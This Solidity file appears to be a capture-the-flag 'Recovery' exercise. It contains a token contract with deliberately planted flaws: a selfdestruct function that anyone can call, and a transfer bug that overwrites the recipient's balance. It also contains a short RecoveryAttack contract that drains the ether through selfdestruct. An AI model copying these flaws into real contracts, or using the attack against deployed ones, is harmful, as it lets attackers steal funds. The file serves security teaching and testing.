// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    // bug here; should add _amount to balances[_to]
    balances[_to] = _amount;
  }

  // clean up after ourselves
  // self-destruct sends all remaining ether stored in the contract
  // to the given address
  // see https://solidity-by-example.org/hacks/self-destruct/
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

// solution used by unit test
// use selfdestruct to recover remaining ether
contract RecoveryAttack {
   SimpleToken vulnContract;

  constructor(address payable _vulnContract) {
    vulnContract =  SimpleToken(_vulnContract);
  }

  function attack(address payable _to) external {
    vulnContract.destroy(_to);
  }
}